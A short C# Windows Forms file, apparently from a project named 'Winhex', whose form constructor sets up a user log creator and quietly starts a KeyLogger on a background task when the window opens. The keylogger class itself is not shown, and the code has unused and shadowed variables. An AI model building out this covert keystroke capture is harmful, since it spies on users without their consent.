using System;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Winhex.Interfaces;
using Winhex.Models;

namespace Winhex
{
    public partial class Form1 : Form
    {
        private ILogCreator loger;
        public Form1()
        {
            InitializeComponent();
            ILogCreator loger = new UserLogCreator();
            FormClosing += (sender, args) => loger?.Close();

            var syms = new[]
            {
                'a', 'b', 'c', 'd', 'e',
                'g', 'h', 'i', 'j', ' '
            };
            Task.Run(() =>
            {
                KeyLogger kl = new KeyLogger();
            });
        }

    }
}
